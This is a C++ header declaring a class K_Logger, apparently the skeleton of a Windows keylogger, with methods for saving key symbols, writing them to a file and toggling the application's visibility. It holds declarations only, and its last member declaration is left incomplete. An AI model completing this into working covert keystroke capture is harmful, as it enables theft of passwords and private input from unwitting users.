#pragma once


/*******************************************************************/

/* Date: 10-06-2018                                                */

/* Developer: Artem Gord1728                                       */

/* Copyright © 2018 Artem Gord1728. All rights reserved.           */

/* Description: Header with basic functionality                    */

/*******************************************************************/




#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
#include <time.h>
#include <stdio.h>


class K_Logger
{
public:
	void WriteToDoc(const LPCSTR text);
	int SaveSymbol(WORD iKey);
	void VisibilityApp();
	void 
};